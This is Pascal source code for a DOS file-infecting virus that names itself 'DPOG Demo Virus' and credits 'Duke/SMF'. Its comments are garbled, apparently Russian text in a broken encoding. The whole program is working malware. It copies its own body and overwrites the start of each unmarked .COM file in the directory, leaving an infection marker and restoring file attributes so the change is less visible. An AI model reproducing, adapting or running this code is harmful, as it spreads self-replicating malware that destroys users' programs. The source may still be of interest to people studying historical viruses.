uses dos;
const VirusSize= 4560 { �㦭�� ������! };
var Author,VirusName,Generator:string;
    ID1,ID2:byte;                        {��⪠ ��ࠦ������}
    N:searchrec;
    VirusBody:array[1..VirusSize] of byte;
    Virus:file;
{------------------}
procedure Infect(i:string);              {��ࠦ���� 䠩���}
var g:file;
    attr:word;
begin
assign(g,i);
GetFAttr(g,attr);                        {��࠭��� �०��� ��ਡ���}
SetFAttr(g,$20);                         {��⠭���� ��ਡ�� Arhive}
reset(g,1);                              {���뫨 䠩�-�����}
blockwrite(g,VirusBody,VirusSize);       {����ᠫ� ������ �����}
seek(g,$0A);
blockwrite(g,ID1,1);                     {�⠢�� ���� ��ࠦ������}
blockwrite(g,ID2,1);
close(g);                                {����뫨 䠩�-�����}
SetFAttr(g,attr);                        {��⠭����� �०��� ��ਡ���}
end;
{------------------}
procedure Check(i:string);
var g:file;
    y,z:byte;
begin
if copy(i,length(i)-10,11)='COMMAND.COM' then Exit;
assign(g,i);
reset(g,1);
seek(g,$0A);
blockread(g,y,1);
blockread(g,z,1);
close(g);
if (y<>ord(ID1)) or (z<>ord(ID2)) then Infect(i);
end;
{------------------}
procedure FindFileForKill;
begin
FindFirst('*.com',$21,N);
while doserror=0 do
  begin
  Check(N.name);
  FindNext(N)
  end;
end;
{------------------}
begin
Author:='Duke/SMF';
VirusName:='DPOG Demo Virus';
Generator:='[DPOG v0.01]';
ID1:=77;
ID2:=36;
assign(Virus,paramstr(0));reset(Virus,1);
blockread(Virus,VirusBody,VirusSize);
close(Virus);
FindFileForKill;
writeln('This is DPOG demo virus');
writeln('Created (c) by Duke/SMF');
end.
